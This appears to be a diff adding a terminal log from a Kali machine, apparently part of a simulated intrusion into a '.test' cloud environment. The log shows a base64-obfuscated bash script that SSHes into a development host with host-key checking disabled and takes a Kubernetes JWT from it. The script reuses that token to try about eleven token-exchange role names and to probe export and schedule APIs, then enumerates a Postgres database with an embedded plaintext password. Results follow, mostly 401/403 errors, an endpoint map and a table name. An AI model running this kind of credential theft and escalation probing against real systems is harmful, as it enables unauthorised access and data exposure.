@@ -1,0 +1,117 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r3.sh <<'B64EOF'
+> IyEvYmluL2Jhc2gKc2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD0xMCByb3dhbi1kZXYgJ2Jhc2ggLXMnIDw8J1JTSCcKc2V0ICtlCkNBPSRIT01FLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkpXVD0kKGt1YmVjdGwgY29uZmlnIHZpZXcgLS1yYXcgLW8ganNvbnBhdGg9J3sudXNlcnNbMF0udXNlci50b2tlbn0nKQpDPWh0dHBzOi8vY2xvdWQtYXBpLmtlcGxlcm9wcy50ZXN0CnAoKXsgZWNobyAiPT09ICQxIjsgc2hpZnQ7IGN1cmwgLXNTIC1tIDEyIC0tY2FjZXJ0ICRDQSAtdyAnXG5bJXtodHRwX2NvZGV9XVxuJyAiJEAiIHwgaGVhZCAtYyAxNTAwOyBlY2hvOyB9CmVjaG8gIiMjIyMjIyMjIyMgQkFTRUxJTkUiCnAgIkdFVCBzY2hlZHVsZXMgSldUIGJlYXJlciIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkSldUIiAiJEMvYXBpL3NjaGVkdWxlcy9TQ0hFRC0yODQxIgpwICJHRVQgc2NoZWR1bGVzIFgtV29ya2xvYWQtVG9rZW4gSldUIiAtSCAiWC1Xb3JrbG9hZC1Ub2tlbjogJEpXVCIgIiRDL2FwaS9zY2hlZHVsZXMvU0NIRUQtMjg0MSIKcCAiR0VUIHNjaGVkdWxlcyBiYXJlIiAiJEMvYXBpL3NjaGVkdWxlcy9TQ0hFRC0yODQxIgplY2hvICIjIyMjIyMjIyMjIFRPS0VOLUVYQ0hBTkdFIFJPTEVTIgpmb3IgciBpbiBleHBvcnQgZXhwb3J0LXJ1bm5lciBleHBvcnQtcm9sZSBleHBvcnRfcm9sZSBzY2hlZHVsZXMgc2NoZWR1bGUtcnVubmVyIHdvcmtsb2FkIHdvcmtsb2FkcyBmaWVsZGxpbmstZXhwb3J0IHJvd2FuLXdvcmtzcGFjZSB3b3Jrc3BhY2U7IGRvCiAgcCAiUE9TVCAvYXBpL3Rva2VuLWV4Y2hhbmdlLyRyIiAtWCBQT1NUIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEpXVCIgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3t9JyAiJEMvYXBpL3Rva2VuLWV4Y2hhbmdlLyRyIgpkb25lCmVjaG8gIiMjIyMjIyMjIyMgV09SS1NQQUNFIEVYQ0hBTkdFIgpwICJHRVQgZXhjaGFuZ2UiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEpXVCIgIiRDL2FwaS93b3Jrc3BhY2VzL2N1cnJlbnQvdG9rZW4tZXhjaGFuZ2UiCnAgIlBPU1QgZXhjaGFuZ2Uge30iIC1YIFBPU1QgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkSldUIiAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAne30nICIkQy9hcGkvd29ya3NwYWNlcy9jdXJyZW50L3Rva2VuLWV4Y2hhbmdlIgpwICJQT1NUIGV4Y2hhbmdlIHJvbGUgZXhwb3J0IiAtWCBQT1NUIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEpXVCIgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3sicm9sZSI6ImV4cG9ydCJ9JyAiJEMvYXBpL3dvcmtzcGFjZXMvY3VycmVudC90b2tlbi1leGNoYW5nZSIKcCAiUE9TVCBleGNoYW5nZSBYLVdvcmtsb2FkLVRva2VuIiAtWCBQT1NUIC1IICJYLVdvcmtsb2FkLVRva2VuOiAkSldUIiAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAne30nICIkQy9hcGkvd29ya3NwYWNlcy9jdXJyZW50L3Rva2VuLWV4Y2hhbmdlIgplY2hvICIjIyMjIyMjIyMjIERBVEEgV0VMTEtOT1dOIgpjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgImh0dHBzOi8vZGF0YS5rZXBsZXJvcHMudGVzdC8ud2VsbC1rbm93bi9maWVsZGtlc3QtY2xpZW50IiB8IGhlYWQgLWMgMjAwMDsgZWNobwplY2hvICIjIyMjIyMjIyMjIFdPUktMT0FEUyBXRUxMS05PV04iCmN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAiaHR0cHM6Ly93b3JrbG9hZHMua2VwbGVyb3BzLnRlc3QvLndlbGwta25vd24vZmllbGRrZXN0LWNsaWVudCIgfCBoZWFkIC1jIDIwMDA7IGVjaG8KZWNobyAiIyMjIyMjIyMjIyBEQiIKZXhwb3J0IFBHUEFTU1dPUkQ9bG9iZjlKdDBTQlc0MzNpbjZ3VVZsa2l4blFyZWg1Sy1aMUxqYlRvZnJxWQpQPSJwc3FsIC1oIGRhdGEua2VwbGVyb3BzLnRlc3QgLVUgcm93YW5fZGF0YSAtZCBmaWVsZGxpbmtfZGF0YSAtQXQiCiRQIC1jICJzZWxlY3QgdGFibGVfc2NoZW1hfHwnLid8fHRhYmxlX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYSBub3QgaW4gKCdwZ19jYXRhbG9nJywnaW5mb3JtYXRpb25fc2NoZW1hJykgb3JkZXIgYnkgMSIgMj4mMSB8IGhlYWQgLTgwClJTSAplY2hvIERPTkVfUjMK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r3.sh; bash /tmp/r3.sh; echo DONEMARK_1795199733536$((6*7))
+########## BASELINE
+=== GET schedules JWT bearer
+{"error":"export_role_required"}
+
+[403]
+
+=== GET schedules X-Workload-Token JWT
+{"error":"export_token_required"}
+
+[401]
+
+=== GET schedules bare
+{"error":"export_token_required"}
+
+[401]
+
+########## TOKEN-EXCHANGE ROLES
+=== POST /api/token-exchange/export
+{"error":"subject_mismatch"}
+
+[403]
+
+=== POST /api/token-exchange/export-runner
+{"error":"subject_mismatch"}
+
+[403]
+
+=== POST /api/token-exchange/export-role
+{"error":"subject_mismatch"}
+
+[403]
+
+=== POST /api/token-exchange/export_role
+{"error":"subject_mismatch"}
+
+[403]
+
+=== POST /api/token-exchange/schedules
+{"error":"subject_mismatch"}
+
+[403]
+
+=== POST /api/token-exchange/schedule-runner
+{"error":"subject_mismatch"}
+
+[403]
+
+=== POST /api/token-exchange/workload
+{"error":"subject_mismatch"}
+
+[403]
+
+=== POST /api/token-exchange/workloads
+{"error":"subject_mismatch"}
+
+[403]
+
+=== POST /api/token-exchange/fieldlink-export
+{"error":"subject_mismatch"}
+
+[403]
+
+=== POST /api/token-exchange/rowan-workspace
+{"error":"subject_mismatch"}
+
+[403]
+
+=== POST /api/token-exchange/workspace
+{"error":"subject_mismatch"}
+
+[403]
+
+########## WORKSPACE EXCHANGE
+=== GET exchange
+{"error":"authentication_required"}
+
+[401]
+
+=== POST exchange {}
+{"error":"authentication_required"}
+
+[401]
+
+=== POST exchange role export
+{"error":"authentication_required"}
+
+[401]
+
+=== POST exchange X-Workload-Token
+{"error":"authentication_required"}
+
+[401]
+
+########## DATA WELLKNOWN
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
+########## WORKLOADS WELLKNOWN
+{"purpose":"Workspace identity, build records, trust records, and maintenance policy operations.","related":["https://data.keplerops.test/.well-known/fieldkest-client","https://workloads.keplerops.test/.well-known/fieldkest-client"],"routes":[{"key":"cloud.workspace-exchange","method":"GET","template":"https://cloud-api.keplerops.test/api/workspaces/current/token-exchange"},{"key":"cloud.workspace-token","method":"POST","template":"https://cloud-api.keplerops.test/api/workspaces/current/token-exchange"},{"key":"cloud.build-record","method":"GET","template":"https://cloud-api.keplerops.test/api/build-records/{build_id}"},{"key":"data.export","method":"GET","template":"https://cloud-api.keplerops.test/api/exports/{export_id}"},{"key":"data.export-definition","method":"GET","template":"https://cloud-api.keplerops.test/api/exports/{export_id}/definition"},{"key":"data.export-destination","method":"PATCH","template":"https://cloud-api.keplerops.test/api/exports/{export_id}/destination"},{"key":"data.export-runs","method":"POST","template":"https://cloud-api.keplerops.test/api/exports/{export_id}/runs"},{"key":"workloads.schedule","method":"GET","template":"https://cloud-api.keplerops.test/api/schedules/{schedule_id}"},{"key":"workloads.schedule-update","method":"PATCH","template":"https://cloud-api.keplerops.test/api/schedules/{schedule_id}"},{"key":"workloads.schedule-runs","method":"POST","template":"https://cloud-api.keplerops.test/api/schedules/{schedule_id}/runs"},{"key":"cloud.trust-record","method":"GET","template":"https://cloud-api.keplerops.test/api/trust-records/{trust_id}"},{"key":"cloud.role-exchange","method":"POST","template":"https://cloud-api.keplerops.test/api/token-exchange/{role}"},{"key":"cloud.maintenance","method":"GET","template":"https://cloud-api.keplerops.test/api/maintenance"},{"key":"cloud.policy","method":"GET","template":"https://cloud-api.keplerops.test/api/policies/{policy_id}"}],"title":"Cloud workspace client reference"}
+
+########## DB
+export.partition_bindings
+DONE_R3
